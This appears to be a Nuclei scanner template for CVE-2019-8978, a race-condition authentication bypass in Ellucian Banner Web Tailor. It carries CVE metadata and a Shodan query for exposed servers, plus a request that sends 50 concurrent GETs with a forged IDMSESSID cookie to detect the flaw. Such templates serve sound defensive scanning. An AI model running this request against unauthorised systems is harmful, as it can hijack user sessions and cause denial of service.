id: CVE-2019-8978

info:
  name: Ellucian Banner Web Tailor 8.8.3 - 8.9 - Broken Authentication
  author: pdteam
  severity: high
  description: |
    Ellucian Banner Web Tailor 8.8.3, 8.8.4, 8.9 and Banner Enterprise Identity Services 8.3, 8.3.1, 8.3.2, 8.4 contain an improper authentication caused by a race condition in conjunction with SSO Manager, allowing remote attackers to steal a victim's session (and cause a denial of service) by repeatedly requesting the initial Banner Web Tailor main page with the IDMSESSID cookie set to the victim's UDCID.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to hijack a victim's session.
  remediation: |
    Apply the latest security patches and updates provided by the vendor.
  reference:
    - https://github.com/SecKatie/CVE-2019-8978
    - https://nvd.nist.gov/vuln/detail/CVE-2019-8978
    - https://github.com/projectdiscovery/nuclei-templates/issues/14436
    - https://github.com/projectdiscovery/nuclei-templates/pull/14449
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2019-8978
    cwe-id: CWE-362,CWE-287
    epss-score: 0.00554
    epss-percentile: 0.77708
    cpe: cpe:2.3:a:ellucian:banner_web_tailor:8.8.3:*:*:*:*:*:*:*
  metadata:
    max-request: 50
    vendor: ellucian
    product: banner_web_tailor
    shodan-query: http.component:"Ellucian Banner"
  tags: cve,cve2019,ellucian,banner,race-condition,auth-bypass,kev

variables:
  udcid: "123456789"

http:
  - method: GET
    path:
      - "{{BaseURL}}/wtl/twbkwbis.P_VerifyID"

    headers:
      Cookie: "IDMSESSID={{udcid}}"

    race: true
    race_count: 50

    matchers:
      - type: dsl
        dsl:
          - "contains(header, 'SESSID=') && !contains(body, '<title>Login</title>')"
          - "status_code == 200"
        condition: and
